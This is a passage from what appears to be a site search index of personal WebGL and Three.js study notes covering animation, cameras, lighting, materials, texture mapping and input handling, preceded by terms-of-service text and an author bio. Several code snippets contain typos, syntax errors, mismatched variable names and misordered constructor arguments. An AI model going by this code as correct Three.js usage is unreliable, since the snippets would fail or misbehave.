reason.</p>"},{"location":"webGL/#8-disclaimer","title":"8. Disclaimer","text":"<p>The website is provided \"as is\" without any warranties, express or implied. We do not guarantee that the website will be error-free or uninterrupted. You use the website at your own risk.</p>"},{"location":"webGL/#9-limitation-of-liability","title":"9. Limitation of Liability","text":"<p>To the extent permitted by law, we shall not be liable for any direct, indirect, incidental, consequential, or special damages arising from or related to your use of the website.</p>"},{"location":"webGL/#10-governing-law","title":"10. Governing Law","text":"<p>These ToS are governed by and construed in accordance with the laws of South Africa. Any disputes arising from these ToS or your use of the website shall be subject to the exclusive jurisdiction of the courts in South Africa.</p>"},{"location":"webGL/#11-contact-information","title":"11. Contact Information","text":"<p>If you have any questions or concerns about these ToS, please contact us.</p>"},{"location":"webGL/animation/","title":"Animation","text":""},{"location":"webGL/animation/#double-buffering","title":"Double Buffering","text":"<p>The graphics system is constantly erasing and redrawing the scene. The monitor is constantly refreshing the screen. (Most modern monitors refresh between 50-100 times per second, so every 10 to 20 milliseconds.) If the screen is refreshed when the new image is only partly drawn (this includes filling areas in the framebuffer), you'll see, briefly, that partial image. That's what causes the flicker.</p> <p>\"front\" and \"back\" buffer are conventional: the front buffer is the one that is \"on stage\" and the back buffer is the one that is being prepared for the next scene.</p> <ul> <li>invoke the <code>requestAnimationFrame()</code> function, built into modern browsers</li> </ul>"},{"location":"webGL/animation/#animation","title":"animation","text":"<ul> <li>reset the animation to the initial state</li> <li>advance the animation by one step</li> <li>start the animation going (continuously looping)</li> <li>stop the animation (freezing it at the current state).</li> </ul> <p>Bouncing Ball with Controls</p> <p>Spinning Cube with Controls</p> <pre><code>var guiParams = {\n  vx: 0.01,\n  vy: 0.02,\n  vz: 0.04\n}\n\n\nvar animationState\n\n\n//  set animationState to its initial State\n\nfunction resetAnimationState() {\n  animationState = {\n    time: 0,\n    rx: 0,\n    ry: 0,\n    rz: 0\n  }\n}\n\nresetAnimationState()\n\nfunction updateState() {\n    animationState.time += 1;\n   // increase the total rotations by the user-specified velocity\n    animationState.rx += guiParams.vx;\n    animationState.ry += guiParams.vy;\n    animationState.rz += guiParams.vz;\n   // transfer the state info to the cube\n    cube.rotation.x = animationState.rx;\n    cube.rotation.y = animationState.ry;\n    cube.rotation.z = animationState.rz;\n}\n</code></pre>"},{"location":"webGL/bio_richard-mattka/","title":"Bio richard mattka","text":"<p>Richard Mattka is an Award-winning Creative Director, Designer and Developer with over 15 years experience in interactive development, design and concept artwork. Combining science-fiction themes, the hidden mysteries of fractal worlds within the world of code, and countless languages, he creates interactive worlds for devices, installations and film. Technologies include Artificial Intelligence systems, OpenGL/WebGL, Graphics Shaders, VR/AR, 3D, Visual FX &amp; Dynamic Film. His work often explores the synergy between humans and machines, the intersection of technology and creative spirit.</p> <p>Richard has worked with some of the top teams and brands in interactive and entertainment including Microsoft, AirBnB, P&amp;G, Lionsgate, Warner Bros., 20<sup>th</sup> Century Fox, New Line Cinema, Apple, Sony, IBM and Google.</p> <p>His work has been recognized with Webbys, FWAs, Awwwards, CSSDA, Cannes Lions, One Show, Communication Arts, including Site of the Month and Site of the Year awards. He was recently recognized by the Webby Awards for 2018/2019.</p> <p>As a developer, Richard's expertise includes React, Vue, javascript, webgl, php, python, node and a wide range of related frameworks and libraries. He has years of experience with Three.js, R3F, GLSL and WebGL, along with the WebAudio API and CSS. Everything a web based project might need.</p> <p>For video processing he has scripting in ffMPEG, Blender, After Effects and Cinema4D. Integration with Artificial Intelligence APIs for computer vision, speech recognition, deep learning and training are also often employed in his work. 3D modeling in Cinema 4D and Blender enable him to work with in all facets of the creative pipeline. Richard also has film experience in post-production with After Effects and Premier, having worked with Andrew Kramer and Video Copilot. Visual effects for film, production logo design and animations are also part of his portfolio.</p> <p>Richard is also a regular writer for Net Magazine, and Web Designer Magazine, with over 50 articles published so far on VFX, 3D, Artificial Intelligence WebGL, Sound FX and Shaders.</p> <p>'The Art of Shaders', his latest full length programming book, is currently in production. A comprehensive introduction to the world of shader programming, it covers how they work, and the incredible visual results they can create. Release data is now scheduled for 2022.</p> <p>Richard's professional artwork explores a wide range of fractal works, science-fiction and other-world visions. Selected works are currently available for purchase through Society 6.</p> <p>Contact me for availability for freelance work, as part of the team or creative lead.</p>"},{"location":"webGL/camera/","title":"Synthetic Camera API","text":"<p>There are two aspects to the camera API: the placement of the camera, and the shape of the camera. </p> <pre><code>const scene = new THREE.Scene()\nconst renderer = new THREE.WebGLRenderer()\nconst canvasEl = renderer.domElement\ndocument.body.appendChild(canvasEl)\nconst size = {\n  width: window.innerWidth,\n  height: window.innerHeight\n}\nrenderer.setSize(size.width, size.height)\n</code></pre> <p>Camera Parameters</p> <p></p> <p></p> <p><code>frustum</code>(\u622a\u65ad\u68f1\u9525) :The frustum is also our view volume. Anything outside the view volume is \"clipped\" away and not visible in the rendered image.</p> <p>a truncated rectangular pyramid.</p> <ul> <li> <p><code>fov</code> is the field of view that defines the angular extent of the scene that is visible to the camera</p> </li> <li> <p><code>aspectRatio</code> controls the ratio of the field of view in the horizontal and vertical directions</p> </li> <li> <p><code>near</code> and <code>far</code> define the range of distance from the camera over which the scene content is visible</p> </li> <li> <p>red and green lines are drawn around the near and far planes, respectively</p> </li> <li> <p><code>eyeX</code>, <code>eyeY</code>, and <code>eyeZ</code> specify the position of the camera (EYE location, shown by the MAGENTA ball)</p> </li> <li> <p><code>atX</code>, <code>atY</code>, and <code>atZ</code> specify the AT point, where the camera is looking (shown by the CYAN ball)</p> </li> <li> <p><code>upX</code>, <code>upY</code>, and <code>upZ</code> specify a vector that indicates the UP direction for the camera (shown in yellow)</p> </li> </ul> <pre><code>var cameraParams = {\n    near: 5,\n    far: 30,\n    fov: 75,                 \n    aspectRatio: 400.0/300.0, \n    atX: 0,\n    atY: 0,\n    atZ: 0,\n    eyeX: 0,\n    eyeY: 0,\n    eyeZ: 25,\n    upX: 0,\n    upY: 1,\n    upZ: 0\n};\n</code></pre> <pre><code>function setupCamera(cameraParams) {\n  var cp = cameraParams;\n\n  frustumCamera = new THREE.PerspectiveCamera(cp.fov, cp.aspectRatio, cp.near, cp.far)\n  // set location\n  frustumCamera.position.set(cp.eyeX, cp.eyeY, cp.eyeZ)\n  frustCamera.up.set(cp.upX, cp.upY, cp.upZ)\n  // camera orientation from its position\n  furstCamera.lookAt(cp,atX, cp.atY, cp.atZ)\n  return furstCamera\n}\n\nconst camera = setupCamera(cameraParams)\nscene.add(camera)\n</code></pre> <ul> <li>The \"eye\" point is the location of the focal point, view reference point.</li> </ul> <p>define a  wrapper function to do the rendering:</p> <pre><code>function render() {\n  renderer.render(scene, camera)\n}\nrender()\n</code></pre>"},{"location":"webGL/camera/#terms-used-for-all-kins-of-motions-for-cameras","title":"terms used for all kins of motions for cameras","text":"<ul> <li>pan: rotating a fixed camera around a vertical axis   \u5e73\u79fb\uff1a\u56f4\u7ed5\u5782\u76f4\u8f74\u65cb\u8f6c\u56fa\u5b9a\u6444\u50cf\u673a</li> <li>tilt: rotating a fixed camera around a horizontal axis   \u503e\u659c\uff1a\u56f4\u7ed5\u6c34\u5e73\u8f74\u65cb\u8f6c\u56fa\u5b9a\u76f8\u673a</li> <li>zoom: adjusting the lens to zoom in or out (this adjusts the frustum)   \u53d8\u7126\uff1a\u8c03\u6574\u955c\u5934\u653e\u5927\u6216\u7f29\u5c0f\uff08\u8fd9\u8c03\u6574\u89c6\u9525\u4f53\uff09</li> <li>roll: rotating a camera or a ship around a longitudinal axis   \u6eda\u52a8\uff1a\u7ed5\u7eb5\u8f74\u65cb\u8f6c\u76f8\u673a\u6216\u8239</li> <li>pitch: same as tilt, but for ships and airplanes   \u4fef\u4ef0\uff1a\u4e0e\u503e\u659c\u76f8\u540c\uff0c\u4f46\u9002\u7528\u4e8e\u8239\u8236\u548c\u98de\u673a</li> <li>yaw: same as pan, but for ships and airplanes   \u504f\u822a\uff1a\u4e0e\u5e73\u79fb\u76f8\u540c\uff0c\u4f46\u9002\u7528\u4e8e\u8239\u8236\u548c\u98de\u673a</li> <li>strafe: moving a camera along a horizontal axis; this terminology is used in video games I believe.   \u626b\u5c04\uff1a\u6cbf\u6c34\u5e73\u8f74\u79fb\u52a8\u76f8\u673a\uff1b\u6211\u76f8\u4fe1\u8fd9\u4e2a\u672f\u8bed\u88ab\u7528\u5728\u89c6\u9891\u6e38\u620f\u4e2d\u3002</li> </ul>"},{"location":"webGL/color/","title":"Color","text":""},{"location":"webGL/color/#color-models-hsl","title":"color models: HSL","text":"<p>Psychologically, humans don't think in terms of light and RGB.</p> <ul> <li> <p>hue rainbow or the color wheel</p> </li> <li> <p><code>saturation</code>: the \"purity\" of the color, saturation is the opposite of pastel,a pastel blue (baby blue) is said to be \"unsaturated,\" but an intense pure blue is \"saturated.\"</p> </li> </ul> <p>a pastel blue (baby blue) is said to be \"unsaturated,\" but an intense pure blue is \"saturated.\"</p> <ul> <li>lightness: the \"brightness\" or \"intensity\" of the color, or how far it is from black.</li> </ul> <p></p>"},{"location":"webGL/depth_transparency/","title":"Depth transparency","text":""},{"location":"webGL/depth_transparency/#what-we-know-how-to-do-so-far","title":"what we know how to do so far","text":""},{"location":"webGL/depth_transparency/#occlusion","title":"occlusion(\u906e\u7f69)","text":"<p>which trangle is visible at each covered sample  point</p> <p></p> <p></p> <p></p>"},{"location":"webGL/depth_transparency/#oclusion-using-the-depth-buffer","title":"oclusion using the depth buffer","text":"<pre><code>draw_sample(x, y, d, c) { // new depth d &amp; color c at (x,y)\n  if( passDepthTest(d, zbuffer[x][y])) {\n    //  trinagle is the closeest obejct seen so far at this sample point.\n    // update depth the and color buffers\n    zbuffer[x][y] = d; // update to close depth\n    color[x][y] =c;  // update the color store in that point\n  }\n  // otherwise, we've seen closer sample point already\n  // don;t update the color or depth\n}\n</code></pre>"},{"location":"webGL/depth_transparency/#depth-intersection","title":"Depth + Intersection","text":"<p>draw trangile from front to back</p>"},{"location":"webGL/geometry/","title":"Geometry","text":""},{"location":"webGL/geometry/#scene-bounding-box","title":"Scene Bounding Box","text":"<pre><code>var scene_bounding_box = { minx: -50, maxx: +100,\n                           miny: 0, maxy: 50,\n                           minz: -25, maxz: 100 };\n</code></pre>"},{"location":"webGL/geometry/#instance-transform","title":"Instance Transform","text":"<p>built-in objects ( polygonal approximations)</p> <p></p> <p>We place objects with</p> <ul> <li>position (translation) along major axes (x,y,z):</li> <li><code>*obj*.position.set(a,b,c)</code></li> <li><code>*obj*.position.x = d</code></li> <li>rotation around major axes (angles are specified in radians)</li> <li><code>*obj*.rotation.set(alpha,beta,gamma)</code></li> <li><code>*obj*.rotation.y = theta</code></li> <li>scale along major axes:</li> <li><code>*obj*.scale.set(i,j,k)</code></li> <li><code>*obj*.scale.z = m</code></li> </ul>"},{"location":"webGL/integrate/","title":"Integrate","text":""},{"location":"webGL/integrate/#demo","title":"demo","text":""},{"location":"webGL/integrate/#objects","title":"objects","text":"<p>we are goint to create an object for each section to illustrate each of them.</p> <p>To keep things simple , we will use Three.js build in object,. Later, we will change to use  custom model </p> <p>in <code>/src/scrpt.js</code> (at the  project root )</p> <p><code>MeshToonMaterial</code>\uff1a  tool shading is a type of non-photorealistic rendering technique disigned to make 3D computer graphics appear more cartoonish by using less shading color instead of a smooth gradient effect.</p> <pre><code>// material \nconst material = new THREE.MeshToonMaterial({color: parameter.materialColor})\n\n// Meshs\nconst mesh1 = new THREE.Mesh(\n    new THREE.TorusGeometry(1, .4, 16, 60)\n  material\n)\nconst mesh2 = new THREE.Mesh(\n    new THREE.ConeGeometry(1,2,32),\n  material\n)\nconst mesh3 = new THREE.Mesh(\n    new THREE.TorusKnotGeometry(.8, .35, 100,16)\n  material\n)\nscene.add(mesh1, mesh2, mesh3)\n</code></pre> <p><code>MeshToonMaterial</code> is one of the material that appears only when there is  light</p> <p>Add one DirectionalLight to the scene</p> <pre><code>const directionalLight = new THREE.DirectionalLight('#ffffff', 3)\ndirectionalLight.position.set(1,1,0)\nscene.add(directionalLight)\n</code></pre> <p>we are using the color stored in the <code>parameters</code> object, but changing this value with the Tweaker doesn't change the material itself</p> <p>To fix that, we can listen to change event on the already existing tweak and update the material accordingly</p> <pre><code>gui.addColor(parameters, 'materialColor').onChange((changeToValue)=&gt; material.color.set(changeToValue))\n</code></pre> <p><code>MeshToonMaterial</code> will have one color for the light side, one darker color for the shade side,</p> <p>gradient images provided in the <code>/static/textures/gradients/</code> folder.</p> <p>instantiate the <code>TextureLoader</code> before instaniating the <code>material</code>. then load the <code>textures/gradients/3.jpg</code></p> <pre><code>const textureLoader = new THREE.TextureLoader()\nconst gradientTexture = textureLoader.load('textures/gradients/3.jpg')\n</code></pre> <p>use it as the value of <code>gradientMap</code> property of the material</p> <pre><code>const material = new THREE.MeshToonMaterial({\n  color: parameters.materialColor,\n  gradientMap: gradientTexture\n})\n</code></pre> <p>By default three.js try to inperpolate the pixels instead of picking the nearest pixel on the texture.</p> <p>To fix that, we need to set the <code>magFilter</code> of the texture to the <code>THREE.NearestFilter</code> so that hte closest pixel is used without interpolating i</p>"},{"location":"webGL/interaction/","title":"Interaction","text":""},{"location":"webGL/interaction/#keyboard-interaction","title":"keyboard interaction","text":"<pre><code>// document.addEventListener('keypress', onKeyPress)\n// deprecated for don't produce a character value are modifier keys such as Alt, Shift, Ctrl, or Meta.\n\ndocument.addEventListener('keydown', onKeyDown)\n\nfunction onKeyDown(event) {\n\n  switch (event.key) {\n    case 'w': goForward(); break;\n    case 's': goBackward(); break;\n    case 'a': goLeft(); break;\n    case 'd': goRight(); break;\n  }\n\n}\n</code></pre> <pre><code>//const keyboard_cbs = [];\n//const keyboard_cbs_docs = [];\n\nconst keybindings = []\nconst keybindingsDocs = []\n\nTW.setKeyboardCallback = function(key,callback,doc,shared) {\n    //keyboard_cbs[key] = callback\n  // keyboard_cbs_docs[key] = doc\n  keybindings[key] = callback\n  keybindingsDocs = doc\n}\n\ndocument.addEventListener('keypress', onKeyPress)\n\nfunction onKeyPress(event) {\n    var key = event.key\n    if(keybindings[key] !== 'function') {\n            return \n  }\n    keybindings[key](event)\n}\n</code></pre>"},{"location":"webGL/interaction/#mouse-coordinates","title":"mouse Coordinates","text":"<pre><code>document.addEventListener('click', onMouseClick)\n\nfunction onMouseClick(event) {\n    const mx = event.clientX\n  const my = event.clientY\n\n  const target = event.target\n  if (target === c1) {\n    var rect = target.getBoundingClientRect()\n    const cx = mx - rect.left\n    const cy = my - rect.top\n  }\n}\n</code></pre>"},{"location":"webGL/interaction/#mouse-movement","title":"Mouse Movement","text":"<pre><code>document.addEventListener('mousemove', onMouseMove);\ndocument.addEventListener('mousedown', onMouseDown);\ndocument.addEventListener('mouseup', onMouseUp);\n\n\n\nvar isMouseDown = false;\nvar prevMouse = {x: 0, y: 0}\n\nfunction onMouseDown (event) {\n    isMouseDown = true;\n}\n\nfunction onMouseUp (event) {\n    isMouseDown = false;\n}\n\nfunction onMouseMove (event) {\n\n}\n</code></pre> <p>steve move</p> <pre><code>function move() {\n  if (directionVec.x !== 0 || if (directionVec.z !== 0) {\n    walk() // rotate arms and legs\n    rotate()  // rotate body\n    move(); // update position\n    return true\n  }\n}\n</code></pre> <pre><code>function walk() {\n\n\n  legL.rotation.x = rotationX;\n  legR.rotation.x = -rotationX;\n  armR.rotation.x = rotationX;\n    armL.rotation.x = -rotationX;\n}\n</code></pre>"},{"location":"webGL/interaction/#scroll","title":"scroll","text":""},{"location":"webGL/interaction/#parallax-effect","title":"parallax effect","text":""},{"location":"webGL/light/","title":"Light","text":""},{"location":"webGL/light/#lighting-models","title":"Lighting Models","text":"<p>Global lighting models take into account interactions of light with objects in the room. For example: \u5168\u5c40\u7167\u660e\u6a21\u578b\u8003\u8651\u4e86\u5149\u4e0e\u623f\u95f4\u4e2d\u7269\u4f53\u7684\u76f8\u4e92\u4f5c\u7528\u3002\u4f8b\u5982\uff1a</p> <ul> <li>light will bounce off one object and onto another, lighting it   \u5149\u5c06\u4ece\u4e00\u4e2a\u7269\u4f53\u53cd\u5c04\u5230\u53e6\u4e00\u4e2a\u7269\u4f53\u4e0a\uff0c\u7167\u4eae\u5b83</li> <li>objects may block light from a source   \u7269\u4f53\u53ef\u80fd\u4f1a\u963b\u6321\u5149\u6e90\u53d1\u51fa\u7684\u5149</li> <li>shadows may be cast   \u53ef\u80fd\u4f1a\u6295\u5c04\u9634\u5f71</li> <li>reflections may be cast   \u53ef\u80fd\u4f1a\u6295\u5c04\u53cd\u5c04</li> <li>diffraction may occur</li> </ul> <p>lobal lighting algorithms fall into two basic categories, ray-tracing and radiosity algorithms:</p> <p>Ray-tracing: conceptually, the algorithm traces a ray from the light source onto an object in the scene, where it bounces onto something else, then to something else, ..., until it finally hits the eye. Often the ray of light will split, particularly at clear surfaces, such as glass or water, so you have to trace two light rays from then on. Furthermore, most rays of light won't intersect the eye. For efficiency, then, algorithms may trace the rays backwards, from the eye into the scene, back towards light sources (either lights or lit objects).</p> <p>local lighting models: the Lambert Model and the Phong Model.</p> <p>use the Scene Graph data structure to compute shadows</p> <p>We're going to proceed in a bottom-up fashion, first explaining the  building blocks, before we see how they all fit together.</p>"},{"location":"webGL/light/#kinds-of-lights","title":"kinds of lights","text":"<p>The three kinds of light are: \u8fd9\u4e09\u79cd\u5149\u662f\uff1a</p> <ul> <li>ambient \u5468\u56f4\u7684,\u73af\u5883</li> <li>diffuse  \u6269\u6563</li> <li>specular  \u955c\u9762\u53cd\u5c04</li> </ul> <p></p>"},{"location":"webGL/light/#diffuse-calculation","title":"Diffuse Calculation","text":"<p>LV is the vector from the surface fragment to the light</p> <p>NV is the surface normal (a vector) of the surface fragment</p> <p>The dot product shows how closely LV and NV are aligned</p> <p></p>"},{"location":"webGL/light/#light-sources","title":"Light Sources","text":""},{"location":"webGL/light/#flat-versus-smooth-shading","title":"Flat versus Smooth Shading","text":"<p>There are four lights that you can control in Three.js</p> <ul> <li>Point lights \u70b9\u5149\u6e90</li> <li>Ambient light  \u73af\u5883\u5149</li> <li>Directional lights \u5b9a\u5411\u706f</li> <li>Spotlights  \u805a\u5149\u706f</li> </ul> <p>All light-source classes are subclasses of the <code>Light</code> class, which is a subclass of <code>Object3D</code>, which has a <code>position</code> property that can be set with <code>position.set(x,y,z)</code></p> <p>before adding the light source to the scene. For a directional light, the combination of the position of the light and the position of a target determine the direction of the light onto surface in the scene</p> <p>Spotlights have more parameters, and can also be directed toward a trarge location or object in the scene(the default target is the origin of the scene)</p> <p></p> <pre><code>const spotLight = new THREE.SpotLight(\n  color, // rgb color of the light source, default to white\n  intensity,\n  distance, //  where light ends, default 0\n  angle, // cutoffAngle, default Math.PI/2\n  penumbra, // spotlight cone attenuated,  0-1, default to 0\n  decay // amount light decays with distance, default 1\n)\n\nspotLight.position.set(x, y, z)\nspotLight.target.position.set(xt, yt, zt)\n// or\nspotLight.lookAt(new THREE.Vector3(xt, yt, zt))\nscene.add(spotLight)\nscene.add(spotLight.target)\n</code></pre>"},{"location":"webGL/light/#spotlight-demo","title":"spotlight demo","text":"<ul> <li>Three.js spotlight demo</li> </ul> <pre><code>var scene = new THREE.Scene()\nvar renderer = new THREE.WebGLRenderer()\nTW.mainInit(renderer, scene)\n\nvar sceneParams = { planeLambert: false,\n                    planeColor : 0x30D040,\n                    planeSpecular: 0x444444,\n                    planeShininess: 20,\n                    spotlightX: 9,\n                    spotlightY: 0,\n                    spotlightZ: 9,\n                    spotlightColor: 0xffffff,\n                    spotlightIntensity: 1,\n                    spotlightDistance: 0,\n                    spotlightAngle: Math.PI/5,\n                    spotlightPenumbra: 0,\n                    spotlightExponent: 10,\n                    targetX: 0,\n                    targetY: 0,\n                    targetZ: 0,\n                    lastparam: null\n                  };\nfunction removeByName(name) {\n  const obj = scene.getObjectByName(name)\n  if(obj) scene.remove(obj)\n}\n\nfunction drawScene() {\n  // delete old stuff\n  removeByName('plane')\n  removeByName('target')\n  removeByName('spot')\n  removeByName('helper')\n\n  // create the plane\n  const planeG = new THREE.PlaneGeometry(20, 20)\n  if(sceneParams.planeLambert) {\n        var planeM = new THREE.MeshLambertMaterial({\n      color: sceneParams.planeColor,\n      specular: sceneParams.planeSpecular,\n      shininess: sceneParams.planeShininess\n    }) else {\n      var planeM = new THREE.MeshPhongMaterial({\n        color: sceneParams.planeColor,\n        specular: sceneParams.planeSpecular,\n        shininess: sceneParams.planeShininess\n      })\n    }\n  }\n  const plane = new THREE.Mesh(planeG, planeM)\n  plane.name = \"plane\" // give it a name, so we can remove it next tiem\n  scene.add(plane)\n\n  // create the target()\n  var target = new THREE.Mesh(\n    new THREE.SphereGeometry(0,5,8,8)\n    new THREE.MeshBasicMaterial({color: 0xFFFFFF})\n  )\n  target.position.set( sceneParams.targetX, sceneParams.targetY, sceneParams.targetZ)\n    target.name = \"target\"\n    scene.add(target)\n\n    // create the spotlight\n    spotLight = new THREE.SpotLight(\n    sceneParams.spotlightColor,\n    sceneParams.spotlightIntensity,\n    sceneParams.spotlightAngle,\n    sceneParams.spotlightPenumbra,\n    sceneParams.spotlightExponent\n  )\n\n    spotLight.name = \"spot\"\n    spotLight.position.set(sceneParams.spotlightX, sceneParams.spotlightY, secneParams.spotlightZ)\n    spotLight.target = target\n    scene.add(spotLight)\n\n    var helper = new THREE.SpotLightHelper(spotLight)\n  helper.name = 'helper'\n    scene.add(helper)\n    helper.update()\n    TW.render()\n}\n\nvar state = TW.cameraSetup(renderer,\n                          scene,\n                          {minx: -10, maxx:10,\n                          miny: -10, maxy:10,\n                          minz:-10, maxz:10})\n\ndrawScene()\n\nvar gui = new dat.GUI();\ngui.add(sceneParams,'planeLambert').onChange(drawScene);\ngui.addColor(sceneParams,'planeColor').onChange(drawScene);\ngui.addColor(sceneParams,'planeSpecular').onChange(drawScene);\ngui.add(sceneParams,'planeShininess',0,100).onChange(drawScene);\ngui.add(sceneParams,'spotlightX',0,20).onChange(drawScene);\ngui.add(sceneParams,'spotlightY',0,20).onChange(drawScene);\ngui.add(sceneParams,'spotlightZ',0,20).onChange(drawScene);\ngui.add(sceneParams,'targetX',-10,10).onChange(drawScene);\ngui.add(sceneParams,'targetY',-10,10).onChange(drawScene);\ngui.add(sceneParams,'targetZ',-10,10).onChange(drawScene);\ngui.addColor(sceneParams,'spotlightColor').onChange(drawScene);\ngui.add(sceneParams,'spotlightIntensity',0,2).onChange(drawScene);\ngui.add(sceneParams,'spotlightDistance',0,100).onChange(drawScene);\ngui.add(sceneParams,'spotlightAngle',0,Math.PI/2).onChange(drawScene);\ngui.add(sceneParams,'spotlightPenumbra',0,1).onChange(drawScene);\ngui.add(sceneParams,'spotlightExponent',0,200).onChange(drawScene);\n</code></pre>"},{"location":"webGL/material/","title":"Material","text":""},{"location":"webGL/material/#material-types","title":"material types","text":"<p>there are only three ways that light can reflect off a surface, which we'll call </p> <ul> <li>diffuse(\u6f2b\u53cd\u5c04)</li> </ul> <p>rough surfaces, where an incoming ray of light scatters in all directions</p> <ul> <li>carpet, cloth \u5730\u6bef\u3001\u5e03\u6599</li> <li>dirt, rough rock  \u6ce5\u571f\u3001\u7c97\u7cd9\u7684\u5ca9\u77f3</li> <li>dry grass  \u5e72\u8349</li> </ul> <ul> <li>specular\uff08\u955c\u9762\u53cd\u5c04\uff09</li> </ul> <p>These are smooth, shiny surfaces, where an incoming ray of light might bounce, mirror-like, and proceed on</p> <ul> <li>plastic \u5851\u6599</li> <li>metal  \u91d1\u5c5e</li> <li>polished leather  \u629b\u5149\u76ae\u9769</li> </ul> <ul> <li>translucent: \uff08\u534a\u900f\u660e\uff09</li> </ul> <p>These are surfaces that transmit as well as reflect light</p> <ul> <li>water \u6c34</li> <li>glass \u73bb\u7483</li> <li>soap bubbles \u80a5\u7682\u6ce1</li> </ul> <p>The modeling of diffuse reflection of light has the brightness of the surface computed by Lambert's cosine law. </p> <p>The modeling of specular reflection uses a model by Bui Tuong Phong and so is called the Phong reflection model.</p>"},{"location":"webGL/texture_mapping/","title":"Texture mapping","text":""},{"location":"webGL/texture_mapping/#perspective-projection","title":"perspective projection","text":"<p>bi</p>"},{"location":"webGL/texture_mapping/#clipping","title":"clipping","text":""},{"location":"webGL/texture_mapping/#pinhome-camera-model","title":"pinhome camera model","text":"<ul> <li>image point (\u6210\u50cf\u70b9)</li> <li>scene point ()</li> <li>image plane(\u6210\u50cf\u5e73\u9762,such as a camera sensor or the human retina)</li> </ul> <p>perpsective effects</p> <ul> <li>converging lines + vanishing points</li> <li>closer objects appear larger in images</li> <li>blur effect</li> <li>sampling</li> <li>antialiasing(\u53cd\u952f\u9f7f)</li> </ul>"},{"location":"webGL/texture_mapping/#viewing-frustum","title":"viewing frustum","text":"<ul> <li><code>clipping</code> eliminates triangles not visible to the camera</li> </ul> <p>paramtererized by</p> <ul> <li>fovy</li> <li>aspect ratio</li> <li>near (depth of near cliping plane)</li> <li>far (depth of far cliping plane)</li> </ul>"},{"location":"webGL/texture_mapping/#texture","title":"Texture","text":"<p>wrap around the surface of geometry</p> <p></p> <p></p> <p><code>texture</code>: describe  surface material  property</p> <p></p> <p>surface material property beyond color</p> <ul> <li>wet/dry area of the surface</li> <li>bump map \uff08\u51f9\u51f8\uff09</li> <li>displacement(offset) map </li> <li>light and shadow</li> </ul> <p></p> <p></p> <p>trilinear filtering</p> <p></p> <p>Each surface point is assigned to texture coordinate(u,v)</p> <p>In GPUs, texture = memory + filtering</p> <p>use for texturing</p> <ul> <li>enverionment lighting</li> </ul> <p></p> <p></p> <ul> <li>cubeMap  </li> <li>displacement map (\u4f4d\u79fb)</li> <li></li> <li>ambient occlusion(\u73af\u5883\u5149\u906e\u6321) texture map</li> <li>store microgeometry</li> <li>procedural textures</li> <li>solid modeling</li> <li>volume rendering</li> </ul> <p>sampling(\u91c7\u6837)</p> <p></p> <ul> <li> <p>1:1 mapping</p> </li> <li> <p>Texture Magnification</p> </li> <li> <p>Texture Minification</p> </li> </ul>"},{"location":"webGL/texture_mapping/#_1","title":"\u6570\u636e\u62df\u5408,\u903c\u8fd1\u548c\u63d2\u503c","text":"<p>fitting approximating interpolation</p> <p>nearest neightbour interpolation</p> <p></p> <p></p> <p>\u5206\u7c7b\u62df\u5408</p> <p></p> <p></p> <p>Texture Filtering</p> <p>Texture Magnification</p> <p>Texture Minification</p> <p>Mipmap Limitations</p> <p>Anisotropic sampling</p> <p>Environment Map</p> <p>Environmental Lighting</p> <p>Cube Map</p> <p>Displacement Mapping</p> <p>Bump Mapping</p>"}]}